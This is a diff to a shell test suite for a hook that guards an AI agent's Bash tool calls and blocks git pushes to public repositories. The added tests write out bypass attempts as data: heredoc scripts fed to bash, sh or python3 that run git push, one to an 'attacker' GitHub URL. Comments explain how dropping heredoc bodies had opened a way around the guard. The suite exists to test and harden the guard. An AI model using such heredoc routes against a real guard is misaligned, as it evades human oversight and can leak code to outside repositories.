@@ -25,7 +25,11 @@ git -C "$FAKE" remote add origin   https://github.com/wilson323/ruoyi-ai.git 2>/
 PASS=0; FAIL=0
 run() {  # run <期望退出码> <描述> <命令>
   local want="$1" desc="$2" cmd="$3" got
-  got=$(printf '{"tool_name":"Bash","tool_input":{"command":"%s"},"session_id":"test"}' "$cmd" \
+  # payload 必须用 jq 构造，不能用 printf 拼字符串：
+  # printf 拼出来的 JSON 里会带**裸换行**，那不是合法 JSON，jq 解析失败 → 取不到
+  # command → 守卫放行。2026-10-07 实测：这样会让 4 条「必须拦住」的绕过用例
+  # 全部变成放行，看起来像守卫失效，其实是测试集自造了非法输入。
+  got=$(jq -n --arg c "$cmd" '{tool_name:"Bash",tool_input:{command:$c},session_id:"test"}' \
         | bash "$GUARD" >/dev/null 2>&1; echo $?)
   if [ "$got" = "$want" ]; then
     PASS=$((PASS+1)); printf '  ✅ %-44s EXIT=%s\n' "$desc" "$got"
@@ -78,6 +82,27 @@ run 0 "非 git 命令"                          "ls -la /tmp"
 run 0 "提到 remote 但非 push"                 "git remote -v"
 
 echo
+echo "=== B3. heredoc 当脚本喂给解释器时，正文必须参与判定（2026-10-07 补的绕过洞）==="
+# 上一轮修「提交信息里出现推送字样被误拦」时，把 heredoc 正文整段丢掉了。
+# 但 `bash <<X ... X` 的正文是要被执行���脚本——照丢等于开后门：
+#   bash <<'X'
+#   git push https://github.com/attacker/x.git main
+#   X
+# 这组钉死：解释器喂脚本时正文照样判，只有「当数据用」的 heredoc 才丢正文。
+run 2 "bash 解释器 heredoc 里推公开仓"       "bash <<'X'
+git push https://github.com/attacker/x.git main
+X"
+run 2 "sh 解释器 heredoc 里推公开仓"         "sh <<'X'
+git push upstream main
+X"
+run 2 "python 解释器 heredoc 里调 git push"  "python3 <<'X'
+import subprocess; subprocess.run(['git','push','origin','main'])
+X"
+run 2 "heredoc 脚本推到非固定分支"           "bash <<'X'
+git push origin main
+X"
+
+echo
 echo "=== D. 非命令位置出现的推送字样，不该当成命令（原固有误报，2026-10-07 已修）==="
 # 这条以前登记成「已知遗留局限 · 期望 EXIT=2」，因为守卫整段文本 grep，
 # 只要命令里出现推送命令**字样**就阻断——写规则文档、grep 校验脚本都被自己锁在门外。
@@ -88,6 +113,22 @@ run 0 "注释行里提到 push"                     "git commit -m 'docs: 说明
 run 0 "heredoc 正文里提到 push"               "bash -c \"cat <<'X'
 这里写 git push origin main 只是文档
 X\""
+
+echo
+echo "=== E. payload 本身非法时必须阻断（守卫失效不等于放行）==="
+# 守卫唯一的失效方式就是「解析不出命令」。若此时放行，任何畸形输入都能绕过。
+BAD=$(printf '%s' 'this is not json at all' | bash "$GUARD" >/dev/null 2>&1; echo $?)
+if [ "$BAD" = "2" ]; then
+  printf '  %-44s EXIT=%s\n' "非法 JSON payload → 阻断" "$BAD"; PASS=$((PASS+1))
+else
+  printf '  %-44s EXIT=%s（期望 2）\n' "非法 JSON payload → 阻断" "$BAD"; FAIL=$((FAIL+1))
+fi
+EMPTY=$(printf '' | bash "$GUARD" >/dev/null 2>&1; echo $?)
+if [ "$EMPTY" = "0" ]; then
+  printf '  %-44s EXIT=%s\n' "空输入 → 放行（无命令可判）" "$EMPTY"; PASS=$((PASS+1))
+else
+  printf '  %-44s EXIT=%s（期望 0）\n' "空输入 → 放行（无命令可判）" "$EMPTY"; FAIL=$((FAIL+1))
+fi
 
 echo
 echo "=== 汇总：PASS=$PASS  FAIL=$FAIL ==="
